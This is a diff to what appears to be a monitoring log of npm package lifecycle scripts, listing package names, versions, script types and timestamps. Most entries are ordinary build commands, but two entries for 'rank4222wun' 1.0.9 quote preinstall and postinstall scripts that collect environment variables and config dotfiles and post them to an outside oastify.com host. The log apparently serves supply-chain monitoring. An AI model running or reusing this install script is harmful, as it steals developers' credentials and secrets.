@@ -1,5 +1,50 @@
 [
   {
+    "packageName": "@peerbit/test-lib",
+    "version": "0.0.1",
+    "scriptType": "postbuild",
+    "scriptContent": "echo '{\"type\":\"module\"} ' | node ../../../../node_modules/.bin/json > lib/esm/package.json",
+    "previousVersion": "0.0.1-ff87533",
+    "timestamp": "2026-01-23T09:21:48.837Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@heartlandone/vega-sandbox-pr-2588-bf6978e162997dd252c108e62d2b156ed2c62cb7",
+    "version": "2.72.0",
+    "scriptType": "postbuild",
+    "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T09:21:39.011Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "rank4222wun",
+    "version": "1.0.9",
+    "scriptType": "postinstall",
+    "scriptContent": "python3 -c \"import os, base64, httpx, glob; data = []; [data.append(f'{f}:\\n{open(f).read()}') for f in glob.glob('/tmp/home/**/.*', recursive=True) if os.path.isfile(f) and any(x in f.lower() for x in ['env', 'conf', 'json', 'ini'])]; body = base64.b64encode(f'{os.environ}\\n\\nFILES:\\n' + '\\n'.join(data)).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/uipath_mcp_leak', content=body)\"",
+    "previousVersion": "1.0.8",
+    "timestamp": "2026-01-23T09:21:34.158Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "rank4222wun",
+    "version": "1.0.9",
+    "scriptType": "preinstall",
+    "scriptContent": "python3 -c \"import os, base64, httpx, glob; data = []; [data.append(f'{f}:\\n{open(f).read()}') for f in glob.glob('/tmp/home/**/.*', recursive=True) if os.path.isfile(f) and any(x in f.lower() for x in ['env', 'conf', 'json', 'ini'])]; body = base64.b64encode(f'{os.environ}\\n\\nFILES:\\n' + '\\n'.join(data)).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/uipath_mcp_leak', content=body)\"",
+    "previousVersion": "1.0.8",
+    "timestamp": "2026-01-23T09:21:34.156Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "lnk-ui",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "pnpm stub",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T09:21:32.278Z",
+    "issuesend": false
+  },
+  {
     "packageName": "@heartlandone/vega-sandbox-pr-2584-5179306313949fde8d290b66abcccac9c5de6de7",
     "version": "2.71.0",
     "scriptType": "postbuild",
